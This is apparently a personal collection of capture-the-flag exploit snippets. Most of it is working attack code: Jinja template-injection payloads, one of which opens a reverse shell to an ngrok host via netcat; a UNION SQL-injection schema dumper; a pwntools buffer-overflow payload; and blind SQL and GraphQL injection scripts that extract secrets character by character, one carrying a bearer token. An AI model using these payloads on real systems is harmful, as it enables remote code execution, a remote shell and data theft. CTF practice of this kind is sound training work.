# Rev shell
```python
{{request.application.__globals__.__builtins__.__import__('subprocess').check_output('cat /flag*.txt',shell=True)}}

<pre>{{
self._TemplateReference__context.cycler.__init__.__globals__.os.popen('mkfifo /tmp/f; /tmp/nc 6.tcp.ngrok.io 10911 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f').read()
}}</pre>
```




# Dump DB
```python
import re
import requests
from pwn import *

res = list()

# Quote not found
base_uri = 'https://quotedb-web.2021.ctfcompetition.com/?id=-6944 UNION ALL SELECT NULL,NULL,<column> FROM information_schema.columns LIMIT 1 OFFSET <offset>#'
parser = re.compile(r'"" - (?P<response>.*?)\s*</p>')

offset = 0
restart = True
while restart:
    offsetUri = base_uri.replace("<offset>", str(offset))
    schemaUri = offsetUri.replace("<column>", "TABLE_SCHEMA")
    tableUri = offsetUri.replace("<column>", "TABLE_NAME")
    columnUri = offsetUri.replace("<column>", "COLUMN_NAME")

    schemaRequest = requests.get(url = schemaUri)
    tableRequest = requests.get(url = tableUri)
    columnRequest = requests.get(url = columnUri)

    if "Quote not found" in schemaRequest.text:
        restart = False
    else:
        schema = parser.search(schemaRequest.text).group('response')
        table = parser.search(tableRequest.text).group('response')
        column = parser.search(columnRequest.text).group('response')

        print(schema + " - " + table + " - " + column)

    offset += 1

```


# Some regex
```python
# Regex with capturing group
import re
parser = re.compile(r'^{"b": (?P<base>\d+), "code": "(?P<code>.*?)"')

parsed = parser.search(input)                       # Apply the regex
base = int(parsed.group('base'))                    # Read the BASE group that was matched by the regex, and parse it as a Int
code = parsed.group('code').split()                 # Read the CODE group that was matched by the regex, and split it by space.
decimalCode = map(lambda c: int(c, base), code)     # Copy the array 'code', updating each element of the array to its decimal value. We use the 'base' to tell Python the base in which the input is.
asciiCode = map(lambda dc: chr(dc), decimalCode)    # Copy the array 'decimalCode', updating each element of the array to its Ascii value.
res = ''.join(asciiCode)                            # Transform the array 'asciiCode' into a String, without separation between the element of the array.
```

# Discuss with Netcat #1
```python
from pwn import *

nc = remote('bof101.sstf.site', 1337)

nc.recvuntil(b"addr: ")
printflagadress = int(nc.recvline(), 16)
print(printflagadress)
nc.recvuntil(b":")

payload = b"A"*140 + p32(0xdeadbeef) + b"B"*8 + p64(printflagadress)
nc.write(payload + b"\n")

nc.interactive()
```

# Discuss with Netcat #2
```python
import socket
import re

class Netcat:

    """ Python 'netcat like' module """

    def __init__(self, ip, port):
        self.buff = ""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((ip, port))

    """ Read 1024 bytes off the socket """
    def read(self, length = 1024):
        return self.socket.recv(length)
 
    """ Read data into the buffer until we have data """
    def read_until(self, data):
        while not data in self.buff:
            self.buff += self.socket.recv(1024)
 
        pos = self.buff.find(data)
        rval = self.buff[:pos + len(data)]
        self.buff = self.buff[pos + len(data):]
 
        return rval
 
    def write(self, data):
        self.socket.send(data)
    
    def close(self):
        self.socket.close()


if __name__ == '__main__':
    nc = Netcat('165.227.231.75', 30004)

    # Init, read values
    nc.buff = b''
    nc.read_until(b"> ")

    out = str.encode(str(1) + "\n")
    nc.write(out)

    nc.read_until(b"\n")
    nc.read_until(b"\n")
    input_read = nc.read_until(b"\n").decode("utf-8")
    char_value = dict(re.findall(r'(.)\s->\s(\d+)', input_read))
    nc.read_until(b"> ")

    out = str.encode(str(2) + "\n")
    nc.write(out)

    nc.read_until(b":")
    nc.read_until(b"\n")
    nc.read_until(b"\n")
    calculation = nc.read_until(b"  ").decode("utf-8")
    for key, value in char_value.items():
        calculation = calculation.replace(key, value)

    nc.read_until(b"Answer: ")
    out = str.encode(str(eval(calculation)) + "\n")
    nc.write(out)

    i = 1
    while i < 500:
        i = i + 1
        nc.read_until(b":")
        nc.read_until(b":")
        nc.read_until(b"\n")
        nc.read_until(b"\n")
        calculation = nc.read_until(b"  ").decode("utf-8")
        for key, value in char_value.items():
            calculation = calculation.replace(key, value)

        nc.read_until(b"Answer: ")
        out = str.encode(str(eval(calculation)) + "\n")
        nc.write(out)

    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)
    input_read = nc.read_until(b"\n").decode("utf-8")
    print(input_read)

```

# Starts with
```python
import requests
import string

# We are sure that password is the flag which starts with "TWCTF{"
# and ends with "}"

flag = "CHTB{"
url = "http://138.68.151.248:32634/api/list"

# Each time a 302 redirect is seen, we should restart the loop

restart = True

while restart:
    restart = False

    # Characters like *, ., &, and + has to be avoided because we use regex

    for i in string.ascii_letters + string.digits + "!@#$^()@_{}":
        payload = flag + i
        print(payload)
        post_data = {"order": "(CASE WHEN (SELECT count(1) FROM flag_14389ed139 WHERE flag LIKE '%s%s')=1 THEN id ELSE count END) DESC" % (payload, '%')}
        r = requests.post(url, json=post_data)

        # A correct password means we get This millitary staff member exists.
        if r.json()[1].get('id') == 11:
            print(payload)
            restart = True
            flag = payload

            # Exit if "}" gives a valid redirect

            if i == "}":
                print("\nFlag: " + flag)

                exit(0)
            break
```

# Starts with dichotomy
```python
import requests
import string

url = "https://raw-love.ctfz.one/api"
headers = {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NjcsInVzZXJuYW1lIjoiZm9vZWF6ZXJ0eTEyMzQ1NiIsImlhdCI6MTY5MTkzMjE4MH0.JR1tm0eJRK0u6C_oa2D4cgivN3PGIm2KPjnG4TFvjss'}

def get_val(x):
  high = 128
  low = 0
  while high > low:
    mid = (high + low) // 2

    post_data = {
      "query": "query {filterprofile(description: \"'; a = ("+x+" < "+str(mid)+") ? '1' : '2'; a == '1\") {id}}",
      "variables":{}
    }

    if "\"id\":0" in requests.post(url, json=post_data, headers=headers).text:
      high = mid
    else:
      low = mid + 1

  post_data = {
    "query": "query {filterprofile(description: \"'; a = ("+x+" == "+str(high)+") ? '1' : '2'; a == '1\") {id}}",
    "variables":{}
  }
  if "\"id\":0" in requests.post(url, json=post_data, headers=headers).text:
    return high
  else:
    return high -1

def get_string(s):
  nb_char = get_val(f"{s}.length")

  v = ""
  for i in range(nb_char):
    c = get_val(f"{s}.charCodeAt({i})")
    v += chr(c)
    print(v)

  return v

# print(get_string('this.toString()'))

# nb_objects = get_val('Object.keys(this).length')
# print(f"Nb obj: {nb_objects}")
# for i in range(nb_objects):
#   print(get_string(f"Object.keys(this)[{i}]"))

print(get_string(f"this.secret"))
```
